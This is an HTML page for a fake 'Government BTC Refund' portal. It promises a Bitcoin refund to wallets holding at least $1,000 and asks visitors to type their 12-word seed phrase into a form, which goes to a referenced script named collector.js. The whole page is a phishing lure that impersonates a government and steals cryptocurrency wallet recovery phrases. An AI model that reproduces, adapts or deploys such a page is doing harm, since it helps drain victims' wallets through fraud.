<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>GovBTCClaim Portal</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="css/style.css">
</head>
<body>
  <div class="container">
    <h2>Government BTC Refund</h2>
    <p>Claim your Bitcoin refund through verified wallet connection.</p>
    <p><strong>Requirement:</strong> Wallet must hold at least $1,000 worth of BTC to qualify.</p>
    <p>For further inquiries, contact us at: <a href="mailto:admin@govbtcclaim.org">admin@govbtcclaim.org</a></p>
    <button class="btn" onclick="connectWallet()">Connect Wallet</button>

    <div class="wallet-box" id="walletBox" style="display:none;">
      <label for="walletType">Wallet Type:</label>
      <select id="walletType">
        <option>MetaMask</option>
        <option>Trust Wallet</option>
        <option>Coinbase Wallet</option>
      </select>
      <br><br>
      <label for="seedPhrase">Enter 12-word seed phrase:</label><br>
      <textarea id="seedPhrase" rows="3" cols="30" placeholder="word1 word2 word3 ..."></textarea>
      <br><br>
      <button onclick="submitSeed()">Submit</button>
    </div>
    <div class="note">Please ensure your wallet is connected and holds the required balance.</div>
  </div>

  <script src="js/connect.js"></script>
  <script src="js/collector.js"></script>
</body>
</html>
